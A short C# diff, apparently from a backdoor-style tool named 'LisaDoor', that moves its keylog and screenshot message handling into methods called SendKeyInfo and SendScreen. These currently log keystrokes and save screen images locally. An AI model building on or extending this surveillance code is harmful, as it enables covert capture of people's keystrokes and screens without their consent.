@@ -11,15 +11,23 @@ namespace LisaDoor
             switch (data.MessageType)
             {
                 case MessageType.KEYLOG:
-                    Trace.WriteLine(((KLData)data).TimeCreated + " " + ((KLData)data).KeyData);
+                    SendKeyInfo((KLData)data);
                     break;
                 case MessageType.SCREENIMAGE:
-                    string date = $"{DateTime.UtcNow.Year}{DateTime.UtcNow.Month}{DateTime.UtcNow.Day}{DateTime.UtcNow.Hour}{DateTime.UtcNow.Minute}{DateTime.UtcNow.Second}";
-                    ((SSData)data).Image.Save($"{date}.jpg", ImageFormat.Jpeg);
-                    ((SSData)data).Image.Dispose();
-                    Trace.WriteLine(DateTime.UtcNow + " Screenshot taken");
+                    SendScreen((SSData)data);
                     break;
             }
+        }
+        static void SendKeyInfo(KLData data)
+        {
+            Trace.WriteLine(((KLData)data).TimeCreated + " " + ((KLData)data).KeyData);
+        }
+        static void SendScreen(SSData data)
+        {
+            string date = $"{DateTime.UtcNow.Year}{DateTime.UtcNow.Month}{DateTime.UtcNow.Day}{DateTime.UtcNow.Hour}{DateTime.UtcNow.Minute}{DateTime.UtcNow.Second}";
+            ((SSData)data).Image.Save($"{date}.jpg", ImageFormat.Jpeg);
+            ((SSData)data).Image.Dispose();
+            Trace.WriteLine(DateTime.UtcNow + " Screenshot taken");
         }
         public enum MessageType
         {
